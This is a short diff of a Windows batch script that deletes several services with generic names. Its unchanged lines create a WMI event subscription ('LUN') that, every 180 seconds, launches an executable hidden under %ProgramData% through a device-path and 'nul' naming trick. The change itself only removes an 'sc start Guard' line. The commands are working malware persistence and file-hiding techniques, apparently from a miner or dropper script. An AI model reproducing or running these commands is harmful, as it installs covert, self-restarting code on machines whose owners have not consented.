@@ -69,7 +69,6 @@ sc delete Network
 sc delete Update
 sc delete Performance
 sc delete Configuration
-sc start Guard
 
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="LUN", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="LUN", CommandLineTemplate="\\.\%ProgramData%\nuldata..\nul.exe \\.\%ProgramData%\nuldata..\nul"
